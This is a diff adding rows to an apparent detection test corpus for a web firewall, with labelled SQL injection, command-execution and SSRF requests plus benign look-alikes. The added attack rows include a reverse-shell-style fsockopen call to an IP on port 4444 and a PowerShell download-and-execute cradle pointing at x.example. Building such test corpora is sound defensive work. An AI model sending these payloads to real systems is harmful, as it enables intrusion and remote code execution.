@@ -257,3 +257,28 @@ attack	scanner	app	GET	404	300	>=low	/	Mozilla/5.0 zgrab/0.x
 attack	scanner	app	GET	404	300	>=low	/	masscan/1.3
 attack	scanner	app	GET	404	300	>=low	/	Mozilla/5.0 (compatible; Nikto/2.5)
 attack	scanner	app	GET	404	300	>=low	/	WPScan v3.8
+# 语法分析（libinjection）补上的 SQL 注入变形；改编自 OWASP CRS 的命令、代码、Java 类、SSRF 写法（v1.7.7）
+attack	sqli	app	GET	200	512	>=high	/item?id=1%27+div+0+--+
+attack	sqli	app	GET	200	512	>=high	/item?id=1%29%29+or+%28%281
+attack	sqli	app	GET	200	512	>=high	/item?id=admin%27+or+1%23
+attack	sqli	app	GET	200	512	>=high	/item?id=1+and+ascii(substring(user(),1,1))%3E64
+attack	sqli	app	GET	200	512	>=high	/item?id=1%27::int
+attack	rce	app	GET	200	512	>=high	/run?cb=array_map(%27system%27,array(%27id%27))
+attack	rce	app	GET	200	512	>=high	/run?f=fsockopen(%2745.77.10.20%27,4444)
+attack	rce	app	GET	200	512	>=high	/run?x=%24a(%27id%27)
+attack	rce	app	GET	200	512	>=high	/api?x=require(%27child_process%27).exec(%27id%27)
+attack	rce	app	GET	200	512	>=high	/api?type=java.io.ObjectInputStream
+attack	rce	app	GET	200	512	>=high	/ping?host=127.0.0.1;base64+-d+/tmp/x
+attack	rce	app	GET	200	512	>=high	/ping?host=x%7Ccd+/tmp
+attack	rce	app	GET	200	512	>=high	/ping?host=127.0.0.1%26iex(New-Object+Net.WebClient).DownloadString(%27http://x.example/a%27)
+attack	rce	app	GET	200	512	>=high	/ping?host=for+/f+%25i+in+(%27whoami%27)+do+echo+%25i
+attack	ssrf	app	GET	200	512	>=high	/fetch?url=http://localhost4/admin
+attack	ssrf	app	GET	200	512	>=high	/fetch?url=http://0x7f000001/
+benign	search	app	GET	200	5000	none	/search?q=Left+(WA,+RR)+following+wood+edge+south
+benign	search	app	GET	200	5000	none	/search?q=while+(foo)+is+bar.
+benign	search	app	GET	200	5000	none	/search?q=One+quarter+(24%25)+of+people
+benign	search	app	GET	200	5000	<=low	/forum?title=how+to+use+file_get_contents()+safely
+benign	normal	app	GET	200	5000	none	/files?name=photo+copy+(2).jpg
+benign	normal	app	GET	200	5000	none	/odata/Products?$top=10&$select=Name,Price
+benign	normal	app	GET	200	5000	none	/api/version?v=127.0.1
+benign	normal	app	GET	200	5000	none	/docs/java/lang/Runtime.html
